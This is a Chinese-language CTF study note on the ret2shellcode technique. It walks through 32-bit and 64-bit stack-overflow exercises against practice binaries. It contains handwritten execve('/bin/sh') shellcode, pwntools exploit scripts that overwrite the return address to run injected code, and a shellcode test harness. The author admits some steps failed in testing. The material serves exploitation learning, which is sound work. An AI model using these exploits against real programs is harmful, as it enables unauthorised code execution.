# Rop-Ret2Shellcode 学习

---

ret2shellcode，即控制程序执行shellcode代码，shellcode需要放在一个可执行区域，然后通过返回地址找到这个地方执行填充好的恶意代码，获取shell。

---

### 使用场景

没有执行shell的函数，即没有system("/bin/sh")函数，没有开启NX保护

传入自定义的shellcode

--> ret2libc

开启NX(可写的不可执行)

使用libc函数，leak libc + ROP

More：ret2csu、ret2syscall、stack pivot、ret2dl_resolve



### Shellcode

​		shellcode是黑客编写的用于实行特定代码的**汇编代码**，通常是开启一个shell。

例如：execve("/bin/sh",null,null)

Shellcode获取的两种方式：

1. 手写

   - 想办法调用execve("/bin/sh",null,null)；

   - 传入字符串/bin///sh

   - 系统调用execvce

     eax = 11

     ebx = bin_sh_addr（参数一）

     ecx = 0 （参数二）

     edx = 0 （参数三）

2. pwntools自动生成
   - 先指定context.arch = "i386/amd64"
   - asm(自定义shellcode)
   - asm(shellcraft.sh())
   - 自动生成shellcode



### 例题1

#### checksec查看程序保护

![](https://ms-study.oss-cn-chengdu.aliyuncs.com/Binary_study/RE/Snipaste_2021-02-26_20-58-01.png)

很明显 该题无NX保护

#### 使用objdump查看函数

同时 查找是否具有system()函数

![](https://ms-study.oss-cn-chengdu.aliyuncs.com/Binary_study/RE/Snipaste_2021-02-26_21-00-37.png)

由上图可知，很明显函数中没有现成的system函数，需要我们构造；**无法使用ret2text的方法！**

#### gdb查看

```
gdb ret2shellcode
disass main #查看主函数,得到下图
```

![](https://ms-study.oss-cn-chengdu.aliyuncs.com/Binary_study/RE/Snipaste_2021-02-26_21-11-23.png)

> 分析上述汇编代码，可以三个主要的函数，puts，gets，strncpy 三个函数，然后进一步分析；得到puts函数的参数地址为0x8048660；而gets函数输入的字符串通过strncpy函数存储到0x804a080地址中，而该地址的存储空间为0x64，即100字节；因此，结合前面得到的信息，在此处，我们就可以考虑使用ret2shellcode的方法，构造system函数 输入到存储字符串的地址中，然后是ret到该字符串，将数据解析为代码，然后运行。

```
x/s 0x8048660 #以字符串查看该地址信息
x/s 0x804a080 #查看存储地址信息
```

![](https://ms-study.oss-cn-chengdu.aliyuncs.com/Binary_study/RE/Snipaste_2021-02-26_21-25-12.png)

#### 查看拷贝地址段权限

**介绍两种方式 readelf和vmmap，vmmap使用较多**

```
gdb：readelf

shell：readelf -S （注意大小写，一定是大S）
```

![](https://ms-study.oss-cn-chengdu.aliyuncs.com/Binary_study/RE/Snipaste_2021-02-26_21-30-44.png)

上述方式，不够直接，所示可以使用vmmap来查看，注意：使用vmmap需要先将程序运行起来。

![](https://ms-study.oss-cn-chengdu.aliyuncs.com/Binary_study/RE/Snipaste_2021-02-26_21-33-17.png)

运行后，使用vmmap

![](https://ms-study.oss-cn-chengdu.aliyuncs.com/Binary_study/RE/Snipaste_2021-02-26_21-58-25.png)

在上述题目，程序有点问题，0x804a080对应的段无执行权限，当无NX保护时，该段应该有执行权限，才能保证，反弹到该地址可执行-------->所以正常来说应该具有x权限;目前问题原因不明，暂时跳过 

#### 计算偏移量

```python
cyclic 200 #生成字符串
#gdb 调试程序，运行后 输入所得字符串
#得到溢出地址，使用cyclic计算
cyclic -l 0x62616164
```

![](https://ms-study.oss-cn-chengdu.aliyuncs.com/Binary_study/RE/Snipaste_2021-02-26_21-47-27.png)



#### exp

```python
from pwn import *
context(arch="i386",os ="Linux",log_level = "debug")  #指定环境变量，说明为linux 32位程序
p = process("./Example/ret2shellcode2")
shellcode = asm(shellcraft.sh())   #使用pwntools 自动生成，对应下面的手工生成
shellcode = asm("""   #手工生成
push 0x68
push 0x732f2f2f
push 0x6e69622f
mov ebx,esp
xor ecx,ecx
xor edx,edx
push 11
pop eax
int 0x80
""")
payload = shellcode.ljust(112,b'a') + p32(0x804a080)  #泄露点便宜为112字节，但是shellcode长度不足，因此需要进行填充
p.sendline(payload)
p.interactive()
```





### 手动制作shellcode

32为程序环境

#### 测试shellcode程序代码

```c
#include <stdio.h>

int main(){
    char *shellcode; //存储shellcode
    read(0,shellcode,1000); //读取shellcode
    void(*run)() = shellcode; //创建函数指针指向shellcode，使其从数据转变为代码
    run();  //运行代码
    return 0;
}
```

然后编译，得到一个二进制程序

#### 集成化脚本

```shell
#!/bin/bash
nasm -f elf32 -o shellcode_32.o shellcode_32.asm
#生成.o结尾的文件
ld -m elf_i386 -o shellcode_32_exe shellcode_32.o
#链接成可执行文件(可以跳过此步骤)
objcopy -O binary shellcode_32_exe shellcode_32
#提取可执行代码段，如果没有链接成可执行文件，那么从.o文件中提取也一样
rm -f shellcode_32.o
rm -f shellcode_32_exe
#删除生成过程的文件
```

在这过程中 我们只需要编写shellcode_32.asm 即可；直接写重点程序代码。可不必按照标准格式来

![](https://ms-study.oss-cn-chengdu.aliyuncs.com/Binary_study/RE/Snipaste_2021-02-26_22-31-52.png)

#### 测试生成的shellcode

```python
from pwn import *
f = open("shellcode_32",'r')   # 打开我们生成的shellcode，并读取
shellcode = f.read()
p = process("./shellcode_test")  # 加载测试程序的进程
p.sendline(shellcode)  #然后吧shelldode送入
p.interactive()

```



### Ret2shellcode 64 位示例

64位程序与32位程序原理基本相同，只是细节有些许区别。比如，地址长度 以及 system函数参数个数及参数值

**该题的原理是，具有两次输入，第一次输入到buf，为局部变量，但长度较小，存在栈中，用于覆盖返回地址；而第二次输入到buf2；是全局变量，用于存储shellcode，所以需要返回地址跳到buf2，同时buf2所在段具有可执行权限**

*个人以为该题可以直接通过buf构造，而忽略buf2等；当然该想法尚未实验证实！*

#### 示例源代码

```C
#include <stdio.h>
char buf2[200];   //全局变量，在数据段
int main(){
    setvbuf(stdout,0,2,0);
    char buf[20];    //定于在战中
    printf("what's your name: ");
    gets(buf);
    printf("leave message: ");
    gets(buf2);
    puts(buf2);
    return 0;
}
```



#### 编译

> gcc -no-pie -fno-stack-protector -zexecstack -o ret2shellcode64 ret2shellcode64.c 

对.c文件编译，得到二进制程序

#### 检查保护

![](https://ms-study.oss-cn-chengdu.aliyuncs.com/Binary_study/RE/Snipaste_2021-02-27_12-26-36.png)



#### 查看文件信息

> file ret2shellcode64

![](https://ms-study.oss-cn-chengdu.aliyuncs.com/Binary_study/RE/Snipaste_2021-02-27_12-30-56.png)

可知，目标程序为64位

#### 查看是否有system函数

> objdump -d ret2shellcode64 | grep system

![](https://ms-study.oss-cn-chengdu.aliyuncs.com/Binary_study/RE/Snipaste_2021-02-27_12-28-40.png)

由上述结果可知，无system函数，需要自己构造，因此要使用ret2shellcode的方式

在此题中，由于我们已知源代码，分析源代码可知，数据要注入buf2 ，所以可使用objdump找到buf2的位置

> objdump -d ret2shellcode64 | grep buf2

![](https://ms-study.oss-cn-chengdu.aliyuncs.com/Binary_study/RE/Snipaste_2021-02-27_12-37-35.png)



#### 查看目标存储位置权限

我们希望将shellcode输入到 buf2，然后跳转到该处执行，但需要满足一个必要条件；即存储位置具有可执行性权限

> gdb ret2shellcode64
>
> b *main
>
> r
>
> vmmap

![](https://ms-study.oss-cn-chengdu.aliyuncs.com/Binary_study/RE/Snipaste_2021-02-27_12-43-37.png)

不知道为啥，在Ubuntu 20.04 ，无NX 保护，在数据段，依旧无可执行权限，实验难以为继....,先往下走吧



#### Cyclic 计算偏移

>cyclic 200
>
>r #注意去掉断点
>
>输入 所得字符串

![](https://ms-study.oss-cn-chengdu.aliyuncs.com/Binary_study/RE/Snipaste_2021-02-27_12-49-43.png)

在这个过程中，所得 溢出地址为8字节，而cyclic 只能处理4字节，因此我们选择，后四字节作为地址,计算便宜，使用前四个字节作为地址，会发现便宜多了四字节

>cyclic -l 0x6161616b



#### EXP

```python
from pwn import *
context(arch = "amd64",os = "Linux")
context.log_level =  "debug"
e = ELF("./ret2shellcode64")
buf2 = e.symbols["buf2"]    #这两条指令 加载程序，然后通过符号表搜索buf2，获取buf2的地址,得到的地址为小端序
p = process("./ret2shellcode64")
shellcode = asm(shellcraft.sh())  #自动生成shellcode
offset = 40
payload1 = offset*b'A' + p64(buf2) #p64 将buf2补齐为64位，因为有两次输入，所以有俩个payload，这一次是为了覆盖返回地址
p.recvuntil(": ") #程序有交互，等待提示信息后输入
p.sendline(payload1)
payload2 = shellcode.ljust(200,b'A')
p.recvuntil(": ") #程序有交互，等待提示信息后输入
p.sendline(payload2)
p.interactive()
```

